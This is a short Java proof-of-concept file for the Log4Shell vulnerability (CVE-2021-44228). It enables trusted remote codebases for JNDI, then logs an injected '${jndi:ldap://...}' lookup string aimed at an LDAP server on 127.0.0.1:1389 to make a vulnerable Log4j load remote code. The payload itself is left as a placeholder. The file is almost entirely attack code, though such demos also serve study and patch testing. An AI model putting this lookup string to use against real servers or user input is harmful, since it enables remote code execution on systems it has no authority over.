import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * CVE-2021-44228 POC
 * @author Saad Iqbal
 */
public class log4j {

    private static final Logger logger = LogManager.getLogger(log4j.class);

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true"); //Must be true for 1.8 and 1.7 versions
        logger.error("${java:version}"); 
        String maliciousString = "${jndi:ldap://127.0.0.1:1389/-hexcode from malicious ldap server-}";
        logger.error(maliciousString);
    }
}
